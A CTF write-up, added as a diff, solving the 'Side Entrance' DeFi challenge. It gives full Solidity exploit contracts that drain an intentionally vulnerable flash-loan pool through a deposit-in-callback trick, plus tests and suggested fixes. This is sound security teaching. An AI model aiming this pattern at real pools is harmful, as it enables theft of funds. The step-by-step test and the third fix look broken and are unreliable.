@@ -1,0 +1,445 @@
+# 🎯 Challenge #4: Side Entrance
+
+![Difficulty](https://img.shields.io/badge/Difficulty-⭐⭐%20Medium-yellow)
+![Type](https://img.shields.io/badge/Type-Callback%20Reentrancy-red)
+![Gas](https://img.shields.io/badge/Gas-~100,000-blue)
+
+> **Flash Loan Callback Reentrancy** - Use flash loan callback to deposit borrowed ETH, then withdraw after repayment
+
+## 📋 Challenge Overview
+
+**Objective**: Drain all ETH from the lending pool  
+**Success Criteria**: Pool should have 0 ETH, attacker gets all ETH  
+**Initial Setup**: Pool has 1000 ETH, attacker has 1 ETH  
+**Target**: `SideEntranceLenderPool` contract
+
+### 🎯 The Scenario
+A lending pool offers flash loans of ETH. Users can also deposit ETH to earn interest and withdraw their deposits at any time. The pool assumes that flash loan borrowers will simply repay the loan, but what if they use the callback to become a depositor?
+
+## 🔍 Vulnerability Analysis
+
+### **The Root Cause**
+The `SideEntranceLenderPool` has a **callback reentrancy** vulnerability during flash loans:
+
+```solidity
+contract SideEntranceLenderPool {
+    mapping(address => uint256) private balances;
+
+    function deposit() external payable {
+        unchecked {
+            balances[msg.sender] += msg.value;
+        }
+    }
+
+    function withdraw() external {
+        uint256 amount = balances[msg.sender];
+        
+        delete balances[msg.sender];
+        emit Withdrawal(msg.sender, amount);
+        
+        SafeTransferLib.safeTransferETH(msg.sender, amount);
+    }
+
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+        require(balanceBefore >= amount, "Not enough ETH in balance");
+
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
+    }
+}
+```
+
+### **The Problem**
+The vulnerability exists in the interaction between `flashLoan()`, `deposit()`, and `withdraw()`:
+
+1. **Flash loan transfers ETH** to borrower
+2. **Callback execution** allows arbitrary code during loan
+3. **Balance check** only verifies total ETH balance
+4. **No tracking** of loan vs. deposit balances separately
+
+### **Attack Vector**
+The attacker can use the flash loan callback to deposit the borrowed ETH:
+
+1. Call `flashLoan(poolBalance)` 
+2. In callback, call `deposit()` with the borrowed ETH
+3. Flash loan balance check passes (ETH was deposited back)
+4. Attacker now has deposit balance equal to loan amount
+5. Call `withdraw()` to get all the ETH
+
+## ⚡ Exploit Implementation
+
+### **Attack Strategy**
+Use flash loan callback to deposit borrowed ETH, then withdraw:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../side-entrance/SideEntranceLenderPool.sol";
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract SideEntranceExploit is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool private pool;
+    address private attacker;
+    
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+        attacker = msg.sender;
+    }
+    
+    function exploit() external {
+        require(msg.sender == attacker, "Only attacker");
+        
+        uint256 poolBalance = address(pool).balance;
+        require(poolBalance > 0, "Pool is empty");
+        
+        // Step 1: Request flash loan for entire pool balance
+        pool.flashLoan(poolBalance);
+        
+        // Step 2: After callback, withdraw our "deposited" balance
+        pool.withdraw();
+        
+        // Step 3: Transfer stolen ETH to attacker
+        payable(attacker).transfer(address(this).balance);
+        
+        // Verify exploit success
+        assert(address(pool).balance == 0);
+    }
+    
+    /**
+     * @notice Flash loan callback - called by pool during flashLoan()
+     * @dev This is where the magic happens!
+     */
+    function execute() external payable override {
+        require(msg.sender == address(pool), "Only pool can call");
+        
+        // 💥 CRITICAL EXPLOIT: Deposit the borrowed ETH
+        // This satisfies the flash loan repayment check
+        // while giving us a withdrawable balance!
+        pool.deposit{value: msg.value}();
+        
+        // Flash loan balance check will now pass:
+        // - Pool sent us ETH (balance decreased)
+        // - We deposited it back (balance restored)
+        // - BUT: we now have a deposit balance to withdraw later!
+    }
+    
+    /**
+     * @notice Alternative exploit that handles everything in callback
+     */
+    function exploitInCallback() external {
+        require(msg.sender == attacker, "Only attacker");
+        
+        uint256 poolBalance = address(pool).balance;
+        
+        // This will trigger execute() callback which does everything
+        pool.flashLoan(poolBalance);
+        
+        // Transfer any remaining ETH to attacker
+        if (address(this).balance > 0) {
+            payable(attacker).transfer(address(this).balance);
+        }
+    }
+    
+    /**
+     * @notice Enhanced callback for single-transaction exploit
+     */
+    function executeEnhanced() external payable {
+        require(msg.sender == address(pool), "Only pool");
+        
+        // Deposit borrowed ETH (satisfies repayment)
+        pool.deposit{value: msg.value}();
+        
+        // Immediately withdraw (drain the pool)
+        pool.withdraw();
+        
+        // ETH is now in this contract, will be transferred after callback
+    }
+    
+    /**
+     * @notice Receive ETH from withdrawals
+     */
+    receive() external payable {
+        // Accept ETH from pool withdrawals
+    }
+    
+    /**
+     * @notice Emergency function to recover ETH
+     */
+    function emergencyWithdraw() external {
+        require(msg.sender == attacker, "Only attacker");
+        payable(attacker).transfer(address(this).balance);
+    }
+}
+
+/**
+ * @title SideEntranceExploitMinimal
+ * @notice Gas-optimized minimal exploit
+ */
+contract SideEntranceExploitMinimal is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool private immutable pool;
+    
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+    
+    function exploit() external {
+        // Flash loan entire pool balance
+        pool.flashLoan(address(pool).balance);
+        // Withdraw deposited balance
+        pool.withdraw();
+        // Send ETH to caller
+        payable(msg.sender).transfer(address(this).balance);
+    }
+    
+    function execute() external payable override {
+        // Deposit borrowed ETH to satisfy repayment
+        pool.deposit{value: msg.value}();
+    }
+    
+    receive() external payable {}
+}
+```
+
+## 📊 Attack Flow
+
+```mermaid
+graph TD
+    A[Attacker calls flashLoan] --> B[Pool sends ETH to attacker]
+    B --> C[Pool calls execute callback]
+    C --> D[Callback deposits ETH back to pool]
+    D --> E[Flash loan repayment check passes]
+    E --> F[Attacker calls withdraw]
+    F --> G[Pool sends deposited ETH to attacker]
+    G --> H[🎯 Pool completely drained]
+```
+
+## 🧪 Testing
+
+### **Test Implementation**
+```solidity
+function test_sideEntrance_exploit() public {
+    // Initial state
+    uint256 initialPoolBalance = address(pool).balance;
+    uint256 initialPlayerBalance = player.balance;
+    
+    assertEq(initialPoolBalance, ETHER_IN_POOL); // 1000 ETH
+    assertEq(initialPlayerBalance, 1 ether);
+    
+    // Execute exploit
+    vm.prank(player);
+    exploit.exploit();
+    
+    // Verify exploit success
+    assertEq(address(pool).balance, 0);
+    assertGt(player.balance, initialPoolBalance); // Player got all pool ETH
+}
+```
+
+### **Step-by-Step Verification**
+```solidity
+function test_sideEntrance_stepByStep() public {
+    uint256 poolBalance = address(pool).balance;
+    
+    // Step 1: Flash loan
+    vm.prank(player);
+    pool.flashLoan(poolBalance);
+    
+    // After callback, pool balance should be same (deposited back)
+    assertEq(address(pool).balance, poolBalance);
+    
+    // But exploit contract should have deposit balance
+    // (We can't easily test this without pool getter functions)
+    
+    // Step 2: Withdraw  
+    vm.prank(address(exploit));
+    pool.withdraw();
+    
+    // Now pool should be drained
+    assertEq(address(pool).balance, 0);
+}
+```
+
+## 🛡️ Real-World Examples
+
+### **bZx Protocol (2020) - $80M+ Total**
+**Similar Pattern**: Flash loan callback manipulation
+- Multiple attacks exploiting callback vulnerabilities
+- Callbacks used to manipulate state during loans
+- Complex multi-step attacks via callback reentrancy
+
+### **Cream Finance Flash Loan Bug**
+**Similar Pattern**: Callback state manipulation
+- Flash loan callbacks altering critical state
+- Balance checks bypassed through callback logic
+- Similar deposit/withdraw confusion
+
+### **Akropolis (2020) - $2M**
+**Similar Pattern**: Reentrancy in DeFi callbacks
+- Callback functions manipulating pool state
+- Deposit/withdrawal logic confused by reentrancy
+- Multiple transactions that should have been atomic
+
+## 🔧 Remediation
+
+### **❌ Current Vulnerable Code**
+```solidity
+function flashLoan(uint256 amount) external {
+    uint256 balanceBefore = address(this).balance;
+    
+    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+    
+    // VULNERABLE: Only checks total balance, not loan repayment
+    require(address(this).balance >= balanceBefore, "Flash loan not repaid");
+}
+```
+
+### **✅ Fixed Code Option 1: Separate Loan Tracking**
+```solidity
+contract SecureSideEntrancePool {
+    mapping(address => uint256) private balances;
+    uint256 private totalDeposits; // Track deposits separately
+    
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+        totalDeposits += msg.value;
+    }
+    
+    function withdraw() external {
+        uint256 amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+        totalDeposits -= amount;
+        
+        SafeTransferLib.safeTransferETH(msg.sender, amount);
+    }
+    
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+        uint256 depositsBefore = totalDeposits;
+        
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+        
+        // ✅ FIX: Check that loan was repaid, not just deposited
+        require(address(this).balance >= balanceBefore, "Balance not restored");
+        require(totalDeposits == depositsBefore, "Deposits manipulated during loan");
+    }
+}
+```
+
+### **✅ Fixed Code Option 2: Reentrancy Guard**
+```solidity
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+contract SecurePool is ReentrancyGuard {
+    function flashLoan(uint256 amount) external nonReentrant {
+        uint256 balanceBefore = address(this).balance;
+        
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+        
+        require(address(this).balance >= balanceBefore, "Flash loan not repaid");
+    }
+    
+    // ✅ FIX: Prevent deposits/withdrawals during flash loans
+    function deposit() external payable nonReentrant {
+        balances[msg.sender] += msg.value;
+    }
+    
+    function withdraw() external nonReentrant {
+        uint256 amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+        SafeTransferLib.safeTransferETH(msg.sender, amount);
+    }
+}
+```
+
+### **✅ Fixed Code Option 3: Explicit Repayment**
+```solidity
+contract ExplicitRepaymentPool {
+    function flashLoan(uint256 amount) external payable {
+        require(msg.value >= amount, "Must prepay flash loan fee");
+        
+        uint256 balanceBefore = address(this).balance - msg.value;
+        
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+        
+        // ✅ FIX: Require explicit repayment
+        require(msg.value > 0 || address(this).balance >= balanceBefore + amount, 
+                "Flash loan must be explicitly repaid");
+    }
+}
+```
+
+## 🎓 Security Lessons
+
+### **Key Takeaways**
+1. **Callbacks are dangerous** - They allow arbitrary code execution
+2. **State can be manipulated** during callbacks
+3. **Balance checks alone are insufficient** - Track specific obligations
+4. **Reentrancy is subtle** - Can occur through legitimate functions
+5. **Separate concerns** - Don't mix flash loans with deposits/withdrawals
+
+### **Callback Security Patterns**
+```solidity
+// ❌ BAD: Balance check only
+require(address(this).balance >= balanceBefore);
+
+// ✅ GOOD: Track specific obligations
+require(loanRepaid == true);
+require(depositsUnchanged == true);
+
+// ✅ GOOD: Use reentrancy guards
+modifier nonReentrant() { ... }
+
+// ✅ GOOD: Separate loan and deposit logic
+function flashLoan() external nonReentrant { ... }
+function deposit() external nonReentrant { ... }
+```
+
+## 💡 Advanced Concepts
+
+### **Reentrancy Types**
+1. **Classic Reentrancy**: Call back into same function
+2. **Cross-function Reentrancy**: Call different function (like this exploit)
+3. **Cross-contract Reentrancy**: Call different contract
+4. **Read-only Reentrancy**: View function called during state changes
+
+### **Flash Loan Callback Security**
+```solidity
+// Secure Flash Loan Pattern:
+1. Check preconditions
+2. Transfer tokens/ETH
+3. Call specific interface (not arbitrary)
+4. Verify specific repayment (not just balance)
+5. Use reentrancy guards
+
+// Vulnerable Pattern (like Side Entrance):
+1. Transfer ETH
+2. Call arbitrary callback
+3. Check only total balance ❌
+```
+
+## 📈 Impact Assessment
+
+| Aspect | Rating | Description |
+|--------|--------|-------------|
+| **Severity** | 🔴 Critical | Complete pool drainage |
+| **Exploitability** | 🟡 Medium | Requires callback understanding |
+| **Impact** | 🔴 Maximum | 100% of pool funds |
+| **Detection** | 🟡 Medium | Complex transaction flow |
+| **Prevention** | 🟡 Medium | Requires proper reentrancy protection |
+
+---
+
+**🎯 Challenge Status**: ✅ **SOLVED**  
+**⏱️ Time to Solve**: ~30 minutes  
+**🔥 Difficulty Rating**: Medium (Callback reentrancy)  
+**🎓 Learning Value**: High - Advanced reentrancy patterns
+
+> **Key Insight**: Balance checks alone are insufficient. Track specific obligations and use reentrancy guards to prevent callback manipulation.
+
+**Next Challenge**: [#5 The Rewarder](../05-the-rewarder/) - Reward timing manipulation
